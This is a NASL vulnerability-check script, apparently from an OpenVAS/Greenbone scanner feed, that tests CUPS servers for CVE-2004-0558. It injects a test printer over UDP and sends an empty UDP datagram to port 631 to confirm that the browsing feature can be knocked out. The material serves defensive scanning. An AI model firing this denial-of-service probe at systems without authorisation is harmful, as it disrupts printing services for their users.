CPE = "cpe:/a:apple:cups";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.15900" );
	script_version( "$Revision: 13975 $" );
	script_tag( name: "last_modification", value: "$Date: 2019-03-04 10:32:08 +0100 (Mon, 04 Mar 2019) $" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_cve_id( "CVE-2004-0558" );
	script_bugtraq_id( 11183 );
	script_xref( name: "OSVDB", value: "9995" );
	script_name( "CUPS Empty UDP Datagram DoS Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "This script is Copyright (C) 2004 George A. Theall" );
	script_family( "Denial of Service" );
	script_dependencies( "secpod_cups_detect.sc" );
	script_require_ports( "Services/www", 631 );
	script_mandatory_keys( "CUPS/installed" );
	script_require_udp_ports( 631 );
	script_tag( name: "solution", value: "Upgrade to CUPS 1.1.21rc2 or later." );
	script_tag( name: "summary", value: "The target is running a CUPS server that supports browsing of network
  printers and that is vulnerable to a limited type of denial of service attack. Specifically, the browsing
  feature can be disabled by sending an empty UDP datagram to the CUPS server." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
func add_printer( port, name, desc ){
	var packet, req, res, soc, url, port, name, desc;
	packet = NASLString( "6 ", "3 ", "ipp://example.com:", port, "/printers/", name, " ", "\"n/a\" ", "\"", desc, "\" ", "\"n/a\"" );
	soc = open_sock_udp( port );
	if(!soc){
		return FALSE;
	}
	send( socket: soc, data: NASLString( packet, "\\n" ) );
	close( soc );
	url = NASLString( "/printers/", name );
	req = http_get( item: url, port: port );
	res = http_keepalive_send_recv( port: port, data: req );
	if(!res){
		return FALSE;
	}
	if( egrep( string: res, pattern: NASLString( "Description: ", desc ) ) ) {
		return TRUE;
	}
	else {
		return FALSE;
	}
}
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
vtstrings = get_vt_strings();
host = http_host_name( port: port );
rc = add_printer( port: port, name: vtstrings["lowercase"] + "_test1", desc: vtstrings["default"] + " Test #1" );
if(rc){
	soc = open_sock_udp( port );
	if(!soc){
		exit( 0 );
	}
	send( socket: soc, data: "" );
	close( soc );
	rc = add_printer( port: port, name: vtstrings["lowercase"] + "_test2", desc: vtstrings["default"] + " Test #2" );
	if(!rc){
		security_message( port: port, proto: "udp" );
		exit( 0 );
	}
}
exit( 99 );

